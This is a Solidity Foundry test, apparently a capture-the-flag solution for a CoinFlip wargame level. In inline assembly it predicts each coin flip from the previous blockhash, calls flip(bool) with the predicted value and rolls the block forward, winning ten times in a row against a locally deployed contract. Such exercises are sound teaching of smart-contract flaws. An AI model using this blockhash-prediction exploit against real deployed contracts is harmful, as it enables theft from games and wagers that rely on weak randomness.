pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract ASMCoinFlip is Test {
    CoinFlip public target;

    function setUp() public {
        target = new CoinFlip();
    }

    function testAttackCoinflip() public {
        assembly {
            /// @notice call the forge vm.roll with one block
            /// @param _ptr pointer to current free memory
            function roll_1(_ptr) {
                // compute the vm address, defined as below:
                // address internal constant VM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
                mstore(_ptr, "hevm cheat code")

                // hash the string, it's 15 characters long
                let hevm_hash := keccak256(_ptr, 0xf)
                // we need to correctly encode the address format from bytes32
                // this involves removing the least significant bits to go to uint160 (96bits == 0x60)
                // then correctly encoding as an address (adding the left padding)
                let hevm_addr := shr(0x60, shl(0x60, hevm_hash))

                // load the selector and cast as bytes4
                mstore(_ptr, shl(0xe0, 0x1f7b4f30)) // roll(uint256)

                // roll forward 1 block
                mstore(add(_ptr, 0x4), add(number(), 0x1))

                // call the VM
                let success := call(gas(), hevm_addr, 0, _ptr, 0x24, 0, 0)

                if iszero(success) { revert(0, 0) }

                // move the pointer to free memory
                _ptr := add(_ptr, 0x24)
            }

            function win(_ptr) {
                // load the target address from the storage slot
                let targetAddress := sload(target.slot)

                // store the bytes for the function signature at FMP
                mstore(_ptr, "flip(bool)")

                // shuffle to fetch first 4 bytes
                // and align to the left of the word
                let h := shl(224, shr(224, keccak256(_ptr, 0x0a)))

                // move the ptr past the stored word
                _ptr := add(_ptr, 0x0a)

                // store the function signature
                mstore(_ptr, h)

                // we need to grab some data:
                let value := blockhash(sub(number(), 1))

                // the FACTOR
                let factor := shl(252, 0x8)

                // compute expected
                let expected := div(value, factor)

                // this should be lte 1
                if gt(expected, 1) { revert(0, 0) }

                // store
                mstore(add(_ptr, 0x4), expected)

                // call the function
                let success :=
                    call(
                        gas(), // gas
                        targetAddress, // will be sending to target
                        0, // send 0 wei
                        _ptr, // args offset - we can use our pointer
                        0x24, // args length - selector (bytes4) + data (bytes32)
                        0, // return offset - after our data
                        0 // return length - bool
                    )

                // check we are successful
                if eq(success, 0) { revert(0, 0) }

                // move pointer to free memory
                _ptr := add(_ptr, 0x24)
            }

            // initialize a pointer to free memory
            let ptr := mload(0x40)

            // loop over 10 times in assembly
            for { let i := 0 } lt(i, 10) { i := add(i, 1) } {
                win(ptr)
                roll_1(ptr)
            }
        }

        assertEq(target.consecutiveWins(), 10);
    }
}
